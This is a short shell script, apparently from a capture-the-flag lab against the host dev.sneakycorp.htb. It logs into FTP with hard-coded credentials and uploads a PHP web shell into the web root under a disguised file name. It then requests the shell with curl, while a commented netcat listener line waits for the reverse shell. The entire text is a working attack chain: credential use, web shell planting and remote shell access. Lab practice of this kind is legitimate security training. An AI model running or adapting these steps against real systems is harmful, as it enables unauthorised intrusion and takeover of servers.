ftp -n << EOSCRIPT
open 10.10.10.197
quote user developer
quote pass m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C
bin
cd dev
mkdir a
cd a
put php-web-shell.php ../php1234.php

EOSCRIPT
sleep 1
#nc -lvp 4464   # open in another xterm
curl -i 'http://dev.sneakycorp.htb/php1234.php' &

